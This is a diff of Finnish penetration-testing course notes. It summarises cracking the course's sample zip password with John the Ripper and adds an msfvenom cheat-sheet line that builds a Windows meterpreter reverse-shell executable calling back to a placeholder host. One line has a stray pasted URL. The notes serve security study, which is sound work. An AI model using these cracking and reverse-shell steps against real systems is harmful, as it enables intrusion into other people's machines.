@@ -19,7 +19,7 @@ Karvinen, Tero. Crack File Password With John. 9.2.2023. [https://terokarvinen.c
 - Testitiedosto ladataan ``wget https://TeroKarvinen.com/2023/crack-file-password-with-john/tero.zip ``
 - Otetaan tiedostosta hash ja siirretään se tiedostoon tero.zip.hash ``$HOME/john/run/zip2john tero.zip >tero.zip.hash``
 - Hashia vastaan tehdään sanakirjahyökkäys ``$HOME/john/run/john tero.zip.hash``
-- Puretaan tiedosto ``unzip tero.zip`` annetaan saatu salasana
+- Puretaan tiedosto ``unzip tero.zip`` annetaan saatu salasanahttps://github.com/RonjaVee/Tunkeutumistestaus/settings
 
 
 
@@ -32,9 +32,9 @@ Santos et al 2017: Security Penetration Testing - The Art of Hacking Series Live
 
 Polop et al 2024: HackTricks: MSFVenom - CheatSheet [https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom)
 
-- 
--
--
+- Listaa payloadit: ``msfvenom -l payloads``
+- Windowsin reverse shell payload ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe`
+
 
 ## a) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana
 
